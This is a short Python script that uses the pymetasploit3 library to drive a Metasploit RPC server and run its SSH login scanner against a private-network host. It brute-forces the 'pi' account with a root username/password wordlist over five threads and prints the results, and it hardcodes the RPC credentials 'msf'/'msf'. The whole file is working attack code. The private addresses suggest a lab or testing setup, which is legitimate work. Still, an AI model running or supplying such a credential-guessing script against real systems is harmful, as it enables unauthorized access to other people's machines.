from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(server='192.168.1.164', username='msf', password='msf', port=55552)
exploit = client.modules.use(mtype='auxiliary', mname='scanner/ssh/ssh_login')
exploit['RHOSTS'] = '192.168.1.180'
exploit['THREADS'] = 5
exploit['USERNAME'] = 'pi'
exploit['USERPASS_FILE'] = '/usr/share/metasploit-framework/data/wordlists/root_userpass.txt'
cid = client.consoles.console().cid
console = client.consoles.console(cid)
result = console.run_module_with_output(exploit)
print(result)
console.destroy()